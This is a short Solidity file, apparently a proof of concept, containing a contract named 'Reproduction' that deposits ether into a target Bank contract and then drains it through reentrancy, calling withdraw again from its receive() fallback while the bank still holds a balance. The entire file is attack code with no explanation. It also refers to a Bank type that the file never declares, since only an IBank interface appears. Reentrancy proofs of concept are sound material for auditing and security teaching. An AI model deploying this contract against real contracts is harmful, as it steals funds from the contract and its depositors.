interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Reproduction {
    Bank public targetBank;
    address public admin;

    constructor(address _targetBank) {
        targetBank = Bank(_targetBank);
        admin = msg.sender;
    }

    function depositAndPrepare() external payable {
        require(msg.value > 0);
        targetBank.deposit{value: msg.value}();
    }

    function startExploit(uint amt) external {
        require(msg.sender == admin);
        amt = 1 ether;
        performWithdraw(amt);
    }

    function performWithdraw(uint amt) internal {
        amt = 1 ether;
        targetBank.withdraw(amt);
    }

    receive() external payable {
        if (address(targetBank).balance >= msg.value) {
            targetBank.withdraw(msg.value);
        }
    }
}